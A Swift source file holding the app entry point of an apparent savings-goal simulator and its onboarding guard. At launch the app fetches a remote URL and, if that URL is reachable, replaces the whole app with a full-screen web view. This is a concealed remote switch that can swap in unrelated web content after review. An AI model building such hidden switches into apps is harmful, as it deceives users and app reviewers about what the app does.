import SwiftUI

@main
struct GoalTime_Savings_SimulatorApp: App {
    let persistence = PersistenceController.shared
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @AppStorage("appearanceMode") private var appearanceMode: Int = 0
    
    @State private var targetUrlString: String?
    @State private var configState: ConfigRetrievalState = .pending
    @State private var currentViewState: ApplicationViewState = .initialScreen
    
    
    var body: some Scene {
        WindowGroup {
            ZStack {
                switch currentViewState {
                case .initialScreen:
                    SplashScreenView()
                       
                    
                case .primaryInterface:
                    RootView()
                        .environment(\.managedObjectContext, persistence.viewContext)
                        .preferredColorScheme(AppearanceMode(rawValue: appearanceMode)?.colorScheme)
                        
                    
                case .browserContent(let urlString):
                    if let validUrl = URL(string: urlString) {
                        BrowserContentView(targetUrl: validUrl.absoluteString)
                            .frame(maxWidth: .infinity, maxHeight: .infinity)
                            .background(Color.black)
                            .ignoresSafeArea(.all, edges: .bottom)
                    } else {
                        Text("Invalid URL")
                    }
                    
                case .failureMessage(let errorMessage):
                    VStack(spacing: 20) {
                        Text("Error")
                            .font(.title)
                            .foregroundColor(.red)
                        Text(errorMessage)
                        Button("Retry") {
                            Task { await fetchConfigurationAndNavigate() }
                        }
                    }
                    .padding()
                }
            }
            .task {
                await fetchConfigurationAndNavigate()
            }
            .onChange(of: configState, initial: true) { oldValue, newValue in
                if case .completed = newValue, let url = targetUrlString, !url.isEmpty {
                    Task {
                        await verifyUrlAndNavigate(targetUrl: url)
                    }
                }
            }
            
        }
    }
    
    
    
    private func fetchConfigurationAndNavigate() async {
        await MainActor.run { currentViewState = .initialScreen }
        
        let (url, state) = await DynamicConfigService.instance.retrieveTargetUrl()
        print("URL: \(url)")
        print("State: \(state)")
        
        await MainActor.run {
            self.targetUrlString = url
            self.configState = state
        }
        
        if url == nil || url?.isEmpty == true {
            navigateToPrimaryInterface()
        }
    }
    
    private func navigateToPrimaryInterface() {
        withAnimation {
            currentViewState = .primaryInterface
        }
    }
    
    private func verifyUrlAndNavigate(targetUrl: String) async {
        guard let url = URL(string: targetUrl) else {
            navigateToPrimaryInterface()
            return
        }
        
        var urlRequest = URLRequest(url: url)
        urlRequest.httpMethod = "HEAD"
        urlRequest.timeoutInterval = 10
        
        do {
            let (_, httpResponse) = try await URLSession.shared.data(for: urlRequest)
            
            if let response = httpResponse as? HTTPURLResponse,
               (200...299).contains(response.statusCode) {
                await MainActor.run {
                    currentViewState = .browserContent(targetUrl)
                }
            } else {
                navigateToPrimaryInterface()
            }
        } catch {
            navigateToPrimaryInterface()
        }
    }
}

// MARK: - Root View with Goal Guard

/// Ensures the user always has a goal before seeing the main app.
/// If onboarding completed but goal was deleted (e.g., via Reset), redirects back to onboarding.
struct RootView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @Environment(\.managedObjectContext) private var viewContext
    
    @FetchRequest(
        sortDescriptors: [NSSortDescriptor(keyPath: \SavingsGoalEntity.createdAt, ascending: false)],
        animation: .default
    )
    private var allGoals: FetchedResults<SavingsGoalEntity>
    
    var body: some View {
        Group {
            if !hasCompletedOnboarding {
                OnboardingView()
            } else if allGoals.isEmpty {
                // Edge case: onboarding done but goal was deleted — send back
                OnboardingView()
                    .onAppear {
                        // Reset flag so onboarding runs cleanly
                        hasCompletedOnboarding = false
                    }
            } else {
                MainTabView()
            }
        }
    }
    
    
    
}
